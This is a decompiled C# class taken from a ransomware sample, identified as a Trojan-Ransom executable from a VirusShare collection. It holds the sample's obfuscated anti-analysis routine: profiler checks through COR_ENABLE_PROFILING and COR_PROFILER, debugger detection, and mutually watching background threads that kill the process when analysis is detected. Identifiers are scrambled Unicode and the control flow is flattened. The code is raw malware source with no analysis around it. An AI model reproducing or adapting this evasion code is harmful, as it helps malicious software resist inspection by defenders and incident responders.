// Decompiled with JetBrains decompiler
// Type: 컇≧섹惼尶�鋎
// Assembly: mtrl, Version=5.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D340C4D9-77FF-49DB-A007-50B4002F5AFA
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\HEUR-Trojan-Ransom.Win32.Generic-429a36b53420915e57e9034d24b9ce0668b08c5e0e1d3eca43c67980b9dd2198.exe

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

internal static class 컇\uEBC0\u2267섹惼尶\uFFFD鋎
{
  [DllImport("ntdll.dll", EntryPoint = "NtQueryInformationProcess", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  private static extern int ጡ栁囚\uFFFD釜䦌\u301D\uE584(
    IntPtr ProcessHandle,
    int ProcessInformationClass,
    byte[] ProcessInformation,
    uint ProcessInformationLength,
    out int ReturnLength);

  [DllImport("ntdll.dll", EntryPoint = "NtSetInformationProcess", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  private static extern uint ޕ\uFFFD\u2555\u2447ꟷ뱮邪礪(
    IntPtr ProcessHandle,
    int ProcessInformationClass,
    byte[] ProcessInformation,
    uint ProcessInformationLength);

  [DllImport("kernel32.dll", EntryPoint = "CloseHandle")]
  private static extern bool 헟\u29A1\u2F4D\uF3AA\uEAEB碵柁揪(IntPtr hObject);

  [DllImport("kernel32.dll", EntryPoint = "IsDebuggerPresent")]
  private static extern bool ฐᰇ阝젤灠\uF768权벃();

  [DllImport("kernel32.dll", EntryPoint = "OutputDebugString")]
  private static extern int 耘ᛎ\uFFFD繒翰轼릝ࠑ(string str);

  public static void \uECF2缀糧퀄娅蚖脆垎()
  {
    int num;
    if (Environment.GetEnvironmentVariable("COR_ENABLE_PROFILING") == null)
    {
      if (Environment.GetEnvironmentVariable("COR_PROFILER") != null)
        num = ~-13 - 6 - 6;
      else
        goto label_5;
    }
    else
      goto label_4;
label_3:
    Thread thread;
    switch (num)
    {
      case 1:
        thread.Start((object) null);
        return;
    }
label_4:
    Environment.FailFast("Profiler detected");
label_5:
    thread = new Thread(new ParameterizedThreadStart(컇\uEBC0\u2267섹惼尶\uFFFD鋎.緧ዝ\uF5A7瀒\uFFFD\uED9E샀崈));
    thread.IsBackground = true;
    num = -~(~~7 - 7);
    goto label_3;
  }

  private static void 緧ዝ\uF5A7瀒\uFFFD\uED9E샀崈(object thread)
  {
    int num;
    if (!(thread is Thread thread1))
      num = -(13 - (8 + 7 + (5 + 4)) - -9);
    else
      goto label_4;
label_2:
    while (true)
    {
      switch (num)
      {
        case 1:
          thread1.Start((object) Thread.CurrentThread);
          num = ~-~-2;
          continue;
        case 2:
          thread1 = new Thread(new ParameterizedThreadStart(컇\uEBC0\u2267섹惼尶\uFFFD鋎.緧ዝ\uF5A7瀒\uFFFD\uED9E샀崈));
          thread1.IsBackground = true;
          num = 2 - (-5 - ~5);
          continue;
        case 3:
          goto label_9;
        default:
          goto label_3;
      }
    }
label_3:
    Thread.Sleep(500);
label_4:
    if (!Debugger.IsAttached)
    {
      if (Debugger.IsLogging())
      {
        num = ~(~9 - (6 - 6 - (4 - 9) - 11));
        goto label_2;
      }
      else
        goto label_10;
    }
label_9:
    Environment.FailFast("Debugger detected (Managed)");
label_10:
    if (!thread1.IsAlive)
      Environment.FailFast("Loop broken");
    Thread.Sleep(1000);
    goto label_4;
  }
}
